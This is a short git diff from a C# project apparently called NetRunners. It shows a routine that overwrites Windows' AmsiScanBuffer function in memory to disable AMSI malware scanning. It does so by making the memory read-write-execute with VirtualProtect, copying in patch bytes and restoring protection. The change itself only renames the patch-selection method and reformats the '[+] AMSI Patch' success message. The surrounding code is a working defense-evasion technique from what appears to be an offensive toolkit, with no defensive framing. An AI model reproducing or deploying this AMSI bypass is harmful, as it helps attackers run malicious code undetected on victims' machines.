@@ -45,12 +45,12 @@ namespace NetRunners.Patchers
                     throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
 
                 // patch AmsiScanBuffer
-                patch = GetAmsiPatch();
+                patch = SelectAmsiPatch();
                 VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);       // rwx protect
                 Marshal.Copy(patch, 0, funcAddress, patch.Length);                              // patch
                 VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x20, out oldProtect);       // restore protect
 
-                Console.WriteLine("[+] Successfully Patched AMSI!");
+                Console.WriteLine("[+] AMSI Patch               :   Success!");
                 
                 return true;
             }
